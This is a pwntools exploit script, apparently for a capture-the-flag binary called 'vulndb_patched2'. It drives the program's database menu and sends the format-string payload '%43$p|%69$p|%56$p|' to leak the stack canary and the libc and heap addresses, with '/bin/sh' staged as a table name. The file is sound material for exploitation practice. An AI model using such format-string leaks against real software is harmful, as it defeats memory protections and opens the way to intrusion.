#! /usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendlineafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendlineafter('Table name:', tb_name)
    r.sendlineafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name):
    r.sendlineafter('>>', 'Insert')
    query = r.recvuntil(':', timeout=1)
    while(query[0] == '[' and query[-2] == ':'):
        print(query)
        data = input()
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendlineafter(':', str(data))


def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())


r = process('./vulndb_patched2', env={"LD_LIBRARY_PATH":"."})

create_db(b'system')
select_db(0)
create_table(b'/bin/sh', b'tt', 3)
select_all(b'%43$p|%69$p|%56$p|')

r.recvuntil(b': ')
canary = int(r.recvuntil(b'|',drop=True), 16)
libc = int(r.recvuntil(b'|',drop=True), 16) - 0x270b3
heap = int(r.recvuntil(b'|',drop=True), 16) - 0x2c0

log.info('canary: {:#x}'.format(canary))
log.info('libc  : {:#x}'.format(libc))
log.info('heap  : {:#x}'.format(heap))





r.interactive()
